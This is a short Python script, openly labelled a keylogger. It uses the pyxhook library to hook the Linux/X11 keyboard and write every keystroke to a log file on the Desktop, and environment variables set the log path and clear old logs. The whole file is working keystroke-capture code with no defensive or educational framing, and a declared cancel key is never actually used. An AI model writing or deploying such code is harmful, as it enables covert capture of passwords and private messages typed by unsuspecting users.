import os
import pyxhook

# Define the log file location: use environment variable or default to ~/Desktop/file.log
log_file = os.getenv('pylogger_file', os.path.expanduser('~/Desktop/file.log'))

# Define the cancel key: use environment variable or default to backtick (`) 
cancel_key = ord(os.getenv('pylogger_cancel', '`')[0])

# Clear the log file if the environment variable 'pylogger_clean' is set
if os.getenv('pylogger_clean'):
    try:
        os.remove(log_file)
    except FileNotFoundError:
        pass  # If file doesn't exist, ignore the error

# String to hold the key log data
key_log = ""

# Define what happens on key press
def on_key_press(event):
    global key_log

    # Handle different types of key events using ASCII values for Space and others
    if event.Ascii == 32:  # ASCII value for space
        key_log += "<Space>"
    elif event.Ascii == 9:  # ASCII value for Tab
        key_log += "<Tab>"
    elif event.Ascii == 13:  # ASCII value for Enter
        key_log += "<Enter>"
    elif event.Ascii == 8:  # ASCII value for Backspace
        key_log += "<Backspace>"
    else:
        # If it's a normal character, log it as it is
        key_log += event.Key

    # Write to file after every key press
    with open(log_file, 'w') as f:  # Using 'w' to overwrite and keep it horizontal
        f.write(key_log)

# Create a hook manager and set the key press function
hook_manager = pyxhook.HookManager()
hook_manager.KeyDown = on_key_press

# Hook the keyboard and start the keylogger
hook_manager.HookKeyboard()

try:
    hook_manager.start()  # Correct start method
except KeyboardInterrupt:
    pass  # Exit cleanly if cancelled from command line
except Exception as ex:
    # Log any errors to the log file
    with open(log_file, 'a') as f:
        f.write(f'Error: {ex}\n')
